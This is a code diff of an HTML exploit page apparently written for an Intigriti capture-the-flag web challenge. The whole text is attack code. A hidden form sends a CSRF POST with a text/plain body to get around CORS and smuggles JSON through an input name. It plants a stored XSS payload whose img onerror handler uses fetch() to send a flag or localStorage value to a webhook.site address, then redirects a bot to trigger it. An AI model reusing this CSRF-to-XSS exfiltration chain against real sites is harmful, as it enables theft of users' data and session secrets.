@@ -1,28 +1,26 @@
 <html>
   <body>
     <script>
-      // Step 1: Create the note via a hidden form (CSRF)
+      // Step 1: Create note using form-based CSRF
       const form = document.createElement('form');
       form.action = 'https://challenge-0325.intigriti.io/api/post';
       form.method = 'POST';
-      form.enctype = 'text/plain'; // Bypass CORS preflight
+      form.enctype = 'text/plain'; // Bypass CORS
 
-      const data = JSON.stringify({
+      const payload = JSON.stringify({
         title: 'Leaky Flag',
-        content: '&#x3C;img src="x" onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + document.location.hash.substr(3))" /&#x3E;',
+        content: '&#x3C;img src=x onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + localStorage.getItem(\\'isAuthenticated\\'))" /&#x3E;',
         use_password: 'false'
       });
 
-      // Inject JSON into the form body
       const input = document.createElement('input');
-      input.name = `{"ignored":1, ${data.slice(1)}`;
+      input.name = `_${payload.replace(/"/g, '\\"')}`; // Trick JSON parsing
       form.appendChild(input);
 
-      // Submit the form silently
       document.body.appendChild(form);
       form.submit();
 
-      // Step 2: Redirect to /notes to trigger the XSS
+      // Step 2: Redirect to notes page (bot clicks note)
       setTimeout(() => {
         window.location.href = 'https://challenge-0325.intigriti.io/notes';
       }, 1000);
